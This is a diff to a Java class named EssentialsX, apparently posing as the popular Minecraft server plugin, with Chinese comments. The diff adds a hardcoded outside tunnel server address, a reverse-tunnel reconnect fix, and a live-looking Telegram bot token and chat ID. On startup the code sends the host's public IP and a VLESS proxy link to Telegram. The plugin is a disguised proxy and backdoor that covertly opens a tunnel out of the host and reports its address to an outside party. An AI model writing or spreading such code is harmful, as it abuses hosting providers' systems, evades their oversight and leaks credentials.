@@ -46,16 +46,19 @@ public class EssentialsX extends JavaPlugin {
 
     // ---- client原版.js 部分: 反向隧道客户端 ----
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
-    static final String TUNNEL_HOST = "";
-    static final int TUNNEL_PORT = ;
+    static final String TUNNEL_HOST = "147.189.169.30";
+    static final int TUNNEL_PORT = 6005;
     // 隧道数据回注的本地端口 = 本地 VLESS/WS 服务端口
     // （链路: 玩家VLESS客户端 -> 公网PUBLIC_PORT -> 隧道 -> 本机 65534 -> VLESS 握手接通）
     static final int TUNNEL_LOCAL_PORT = 65534;
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
 
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "";
-    static final String TG_CHAT_ID = "";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
+
+    // 服务器名称
+    static final String SERVER_NAME = "Gamersfreedom美国家宽";
 
     // =========================================================
 
@@ -141,10 +144,14 @@ public class EssentialsX extends JavaPlugin {
         Thread tg = new Thread(() -> {
             String ip = getPublicIp();
             if (ip != null) {
-                sendTelegram("EssentialsX online — public IP: " + ip
-                        + " | VLESS port: " + VLESS_PORT
-                        + (TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty()
-                           ? " | tunnel: " + TUNNEL_HOST + ":" + TUNNEL_PORT : ""));
+                sendTelegram(SERVER_NAME + "EssentialsX 上线"
+                        + "出口 IP: " + ip
+                        + "\n"
+                        + "VLESS订阅: "
+                        + "\n"
+                        + "vless://" + VLESS_UID + "@" + TUNNEL_HOST + ":" + TUNNEL_PORT
+                        + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + TUNNEL_HOST
+                        + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, "UTF-8"));
             } else {
                 sendTelegram("EssentialsX online — public IP: (unknown)");
             }
@@ -362,8 +369,13 @@ public class EssentialsX extends JavaPlugin {
         while (running.get()) {
             try {
                 TunnelControl control = new TunnelControl(host, port, localPort);
-                control.connectBlocking();
-                // connectBlocking 返回后说明已关闭，等 3 秒重连（对应原版 setTimeout 3000）
+                // connectBlocking 在握手成功后立即返回 true（不是等关闭!）
+                // 必须阻塞等到连接真正关闭后, 才能发起下一次重连,
+                // 否则会不停开新连接, 服务器把旧连接踢掉 (code 1000 "Replaced")
+                if (control.connectBlocking()) {
+                    control.closeBlocking(); // 挂起直到连接断开
+                }
+                // 断开后等 3 秒再重连（对应原版 setTimeout 3000）
                 Thread.sleep(3000);
             } catch (Exception e) {
                 try { Thread.sleep(3000); } catch (Exception ignored) { }
